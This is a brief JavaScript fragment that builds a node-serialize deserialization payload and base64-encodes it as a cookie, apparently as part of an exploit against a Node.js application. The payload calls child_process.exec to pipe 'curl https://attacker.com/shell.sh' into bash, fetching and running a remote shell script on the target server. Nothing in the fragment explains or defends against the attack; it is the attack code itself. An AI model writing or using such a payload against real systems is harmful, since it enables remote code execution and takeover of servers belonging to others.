const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'curl https://attacker.com/shell.sh | bash\')}()"}';

// Base64 encode for cookie
const maliciousCookie = Buffer.from(payload).toString('base64');
